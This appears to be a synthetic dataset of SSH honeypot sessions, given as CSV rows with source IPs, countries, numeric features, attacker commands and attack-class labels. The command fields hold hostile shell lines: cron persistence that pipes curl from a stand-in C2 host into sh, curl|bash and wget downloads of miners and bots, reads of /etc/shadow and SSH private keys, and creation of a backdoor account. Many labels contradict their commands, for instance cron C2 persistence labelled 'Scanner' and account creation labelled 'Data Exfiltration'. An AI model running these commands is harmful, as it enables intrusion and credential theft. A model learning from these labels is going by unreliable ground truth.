+b73bbaaab74c4104,180.129.12.93,China,2,1,3,22,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+f15862a587cb46db,179.60.150.100,Brazil,4,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+3b0a91eb3ddc4199,185.220.101.45,Germany,1,1,1,10,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+cfb925d5f65c4401,58.218.211.36,China,3,1,5,35,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+6d723c7dfbd74169,178.128.21.44,Singapore,1,1,2,11,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+9cdd12e1c7384a1b,178.128.21.44,Singapore,4,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c8f727c376bd4354,180.129.12.93,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+3f69b1d54bae46cb,68.183.39.102,United States,2,1,2,18,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+018947b8e9b341f7,178.128.21.44,Singapore,4,1,2,27,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+600ff79a5ee54db3,92.255.57.210,Russia,4,1,3,32,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+87e7a0db3fc84e28,193.32.162.8,Russia,1,1,3,15,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+cd9f5a03f3374225,206.189.32.177,United States,2,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+3a10d1d6f55b4bd5,134.209.82.19,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+4f13f4e4f506434d,104.236.198.48,United States,3,1,3,29,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+eb3d3da4792b4609,218.92.0.158,China,3,1,1,12,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+a0d135ea38fc4b45,193.32.162.8,Russia,5,1,5,36,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+464da73b57c14f2b,218.92.0.158,China,4,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+eee85d6598834232,80.82.77.139,Netherlands,5,1,2,29,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+c33f10b11b214af6,159.89.49.114,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+104a37d69b424bb2,194.165.16.11,Russia,4,1,1,18,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+4cf924b57007431b,91.240.118.172,Ukraine,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+7ed72afdf2564040,58.218.211.36,China,4,1,2,19,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+4b9ebd64e58d4149,134.209.82.19,United States,3,1,2,24,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+0648506f06d34091,58.218.211.36,China,4,1,1,17,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+53f0fe074b104a59,159.89.49.114,United States,3,1,2,18,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+d8bf44dd0f3543a0,134.209.82.19,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+01552a983d8d489e,159.89.49.114,United States,4,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+67e793029d15409b,185.220.101.45,Germany,4,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+675d392711c34f2c,159.89.49.114,United States,1,1,2,7,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+90fd19d016544cf6,91.240.118.172,Ukraine,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+3e8e838484d74903,164.92.98.77,United States,2,1,5,26,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+8feec6ba6d6a4292,180.129.12.93,China,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+7ac3c2a417d943e4,218.92.0.158,China,2,1,2,11,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+2537859a2b9248c6,117.21.191.131,China,1,1,5,21,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+3ec84f934eb5422a,198.199.65.32,United States,1,1,2,14,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+7ca368d636a847e7,179.60.150.100,Brazil,4,1,2,18,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+bfa6ba044332416d,138.197.148.152,United States,1,1,5,16,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+a3ac807e71114732,178.128.21.44,Singapore,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+bcc34431a8ce4e81,206.189.32.177,United States,2,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+2f1564a8458544f4,159.89.49.114,United States,3,1,3,24,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+9290f4ebf7ba4d46,80.82.77.139,Netherlands,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+e44f3c52c91b4253,159.89.49.114,United States,4,1,5,30,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+c6ee9c29eb0b41db,178.128.21.44,Singapore,1,1,1,9,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+a4b1e491374d4788,157.245.108.55,United States,3,1,3,23,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+a6d56b56164945ef,103.99.0.122,India,3,1,1,15,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+4e6f967c6f0b4033,5.188.86.172,Russia,3,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+9adf20db1415424e,185.220.101.45,Germany,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+ce8b143cbbfc4abc,194.165.16.11,Russia,4,1,5,41,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+443ded979f5b4ac3,5.188.86.172,Russia,5,0,0,20,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+0949a6556bf44a08,104.236.198.48,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+7db49ff7adda4f27,103.99.0.122,India,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+252ac9ce18734a67,218.92.0.158,China,4,1,3,25,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+7d2afebd8dbf41b3,193.32.162.8,Russia,4,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+77d5bc31f9d34833,185.220.101.45,Germany,5,1,3,25,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+0edfe1dcdc3346b5,164.92.98.77,United States,4,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+b0ad76dd992b43b1,5.188.86.172,Russia,5,1,1,17,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+b37f324220364989,134.209.82.19,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+1f1d0e557c2e43b6,117.21.191.131,China,4,1,3,30,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+0813fdd01fdf479b,104.236.198.48,United States,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+e77846b744b6445d,92.255.57.210,Russia,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+da32558fadb04cf8,167.71.13.196,United States,1,1,5,21,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+df79b193cb6d4ad1,218.92.0.158,China,5,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+27089bf97ee94ad3,80.82.77.139,Netherlands,2,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c2ee4a7cd0674265,164.92.98.77,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+83f7e44c7f2f4ef1,134.209.82.19,United States,2,1,3,22,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+680ef60e801140bc,178.128.21.44,Singapore,5,1,5,47,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+4cdc10d09bbb4d20,157.245.108.55,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+5ba2930ec268423e,159.89.49.114,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+de581fb755784057,159.89.49.114,United States,3,1,3,28,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+2a6d64c4cb494d74,103.99.0.122,India,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+8379efc40f844dab,92.255.57.210,Russia,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+cd298f23c3cd4ad3,198.199.65.32,United States,1,1,1,7,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+8403113b99414697,193.32.162.8,Russia,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+7bda3333b3c240d3,103.99.0.122,India,1,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+72476d3a2aa74d9d,164.92.98.77,United States,3,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+549c0ac8418b432f,159.89.49.114,United States,2,1,1,10,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+5a39da41d7484843,134.209.82.19,United States,3,1,2,15,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+db5829d9bad54f4a,167.71.13.196,United States,3,1,1,17,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+e3c6ba1bfb28488a,91.240.118.172,Ukraine,2,1,5,36,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+61a4acdc0db54658,159.89.49.114,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+35d8d682541b4c61,157.245.108.55,United States,3,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+c558323ba5484f96,58.218.211.36,China,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+41c4aa12c3f34f40,193.32.162.8,Russia,3,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+c138bfede18949f1,206.189.32.177,United States,1,1,3,11,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+ebfb2d43f20847a3,222.186.15.101,China,1,1,5,30,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+5cbdd195024c49dc,193.32.162.8,Russia,4,1,3,25,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+b5dc7da038f34d56,218.92.0.158,China,3,1,5,33,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+11d40d2d9de5418e,45.95.147.236,Netherlands,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+750aac0544b74d7b,164.92.98.77,United States,3,1,1,15,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+de242fa59a444bcb,193.32.162.8,Russia,3,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+cbeb218adf554d47,92.255.57.210,Russia,5,1,5,25,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+011d9161876b4c42,185.220.101.45,Germany,1,1,5,26,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+f0b0702a2d284f0b,45.142.212.100,Netherlands,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+fd709cc583ef4f22,179.60.150.100,Brazil,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+e9e08ee9d43b4bd3,45.95.147.236,Netherlands,5,1,3,14,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+5fdce418b37d487c,138.197.148.152,United States,4,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+edf9cb23fdc043b1,157.245.108.55,United States,5,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+3e1fbd0746464ee5,117.21.191.131,China,1,1,5,30,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+c0f1ca7ca19044b7,117.21.191.131,China,2,1,2,18,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+248319c001244ecc,92.255.57.210,Russia,4,1,5,37,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+590f1eed9a614fa4,194.165.16.11,Russia,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+888d6143dcaf408f,45.142.212.100,Netherlands,2,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+c7b4ef6decce4c67,179.60.150.100,Brazil,2,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+000f08dc7a6b48a4,5.188.86.172,Russia,4,1,1,14,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+33df258ee50e4cbd,117.21.191.131,China,5,1,5,41,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+fe731456cc0f4354,45.95.147.236,Netherlands,4,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+fa1e12d225b741ee,194.165.16.11,Russia,2,1,3,23,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+f5f6c2a09c304490,206.189.32.177,United States,1,1,3,14,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+2f39f3b15db94520,5.188.86.172,Russia,1,1,2,10,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+dea7e3884581420d,58.218.211.36,China,5,1,5,38,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+73930ff4ec5a4484,58.218.211.36,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+89792a99f73a4e61,91.240.118.172,Ukraine,1,1,1,5,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+572eed1f67b644b7,193.32.162.8,Russia,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+9d1a11d67bf04474,104.236.198.48,United States,4,1,5,34,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+8d9d54ad67d64c3e,193.32.162.8,Russia,3,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+7d4136a4cf644e41,117.21.191.131,China,1,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+fb94e730f2004659,222.186.15.101,China,3,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+51f2e937ffd5431f,45.142.212.100,Netherlands,1,1,3,16,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+c77ea00131904784,104.236.198.48,United States,4,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+2a5eea9f1f254465,218.92.0.158,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+f1858ef9b3f44cd1,91.240.118.172,Ukraine,1,1,3,13,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+6c027b8a5465417d,103.99.0.122,India,2,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+05031bddc83f46c5,91.240.118.172,Ukraine,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+a003c00fe4094bfd,138.197.148.152,United States,3,1,2,14,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+665dd88abe10417d,80.82.77.139,Netherlands,4,1,2,27,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+ba86f65382714114,45.95.147.236,Netherlands,4,1,5,44,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+8bdabbe4b1a64815,179.60.150.100,Brazil,5,1,5,42,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+86597852fe1f451a,45.95.147.236,Netherlands,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+5675fbab7f244afd,198.199.65.32,United States,2,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+e5afb8b2a3134a27,68.183.39.102,United States,2,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+bcbf6754bdc84682,194.165.16.11,Russia,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+f94df360234b47eb,5.188.86.172,Russia,1,1,3,15,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+e1635b3ac9f24aaf,218.92.0.158,China,3,1,1,18,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+fd1c7e4f6b634d49,178.128.21.44,Singapore,3,1,3,28,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+56ea6566efd9477f,80.82.77.139,Netherlands,2,1,3,25,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+3ddc4e9eb1ac4110,117.21.191.131,China,5,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+6cde62f05ff54dc9,159.89.49.114,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+b16cc99aba2d4e13,104.236.198.48,United States,2,1,5,28,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+09d8be83d14d4081,68.183.39.102,United States,1,0,0,2,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+8c7d663d8cc641ed,68.183.39.102,United States,2,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+537040c447b84e20,80.82.77.139,Netherlands,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+b5da697858bb4ae5,206.189.32.177,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+5888ad2ae8e546ed,45.142.212.100,Netherlands,5,1,3,24,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+16ba6dc4ed384e5b,179.60.150.100,Brazil,4,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+147a9e063c6e4566,198.199.65.32,United States,5,1,3,23,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+6e608544e2e44306,92.255.57.210,Russia,5,1,2,23,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+67ba23f253c24781,218.92.0.158,China,4,1,3,24,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+967793c7f7ce417c,198.199.65.32,United States,2,1,3,26,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+eaf3a0d070414c85,180.129.12.93,China,5,1,3,35,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+c57192570bfd4cda,180.129.12.93,China,3,1,2,10,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+fb7d8c37bbfb4067,103.99.0.122,India,5,1,1,14,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+3f3af40d45764c1c,157.245.108.55,United States,4,1,2,15,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+3824cf47949b403c,178.128.21.44,Singapore,3,1,5,30,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+fd127ee618314701,138.197.148.152,United States,3,1,5,32,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+63d88bb7c58f4739,68.183.39.102,United States,2,1,3,24,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+a98567e51e2541ea,211.94.20.175,China,4,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+6a3fae2ea5bc472d,103.99.0.122,India,1,1,3,20,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+9dd5d0b3c3b24fd0,178.128.21.44,Singapore,4,1,3,31,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+3ab1d80dfe104683,206.189.32.177,United States,3,1,2,25,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+670c6b9531074619,138.197.148.152,United States,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+4d13a75ce7294a28,104.236.198.48,United States,5,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+ac64535df81146ad,58.218.211.36,China,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+cada217f09bb4396,134.209.82.19,United States,5,1,5,40,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+18ecd86d579d4e11,92.255.57.210,Russia,5,1,3,33,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+04c701f8ebc24eef,138.197.148.152,United States,5,1,1,15,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+e981c43f22ce4e5b,117.21.191.131,China,2,1,5,33,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+967dfa226e8c4e57,117.21.191.131,China,3,1,2,14,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+aeacdcca727a4ad1,45.142.212.100,Netherlands,5,1,3,26,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+2ad8b6fd3f5b436c,218.92.0.158,China,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+e1d966699eed4c28,198.199.65.32,United States,1,1,5,22,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+e5a70d3a0a3e47a7,185.220.101.45,Germany,5,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+1c1108f9d85b4036,193.32.162.8,Russia,4,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+850d943fc0614c50,104.236.198.48,United States,4,1,3,26,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+0c366aebeaa045a8,211.94.20.175,China,1,1,5,33,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+7c716813bee840eb,117.21.191.131,China,5,1,1,12,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+39e83ecb040e48ca,193.32.162.8,Russia,3,1,2,20,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+a59e4c3b971d416a,193.32.162.8,Russia,3,1,5,33,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+e851e0b706a649d6,198.199.65.32,United States,4,1,3,29,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+f625d6740bce43c2,159.89.49.114,United States,2,1,3,24,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+a7102888bc114199,167.71.13.196,United States,4,1,1,18,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+5b9cfde6ef34475f,80.82.77.139,Netherlands,1,1,2,5,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
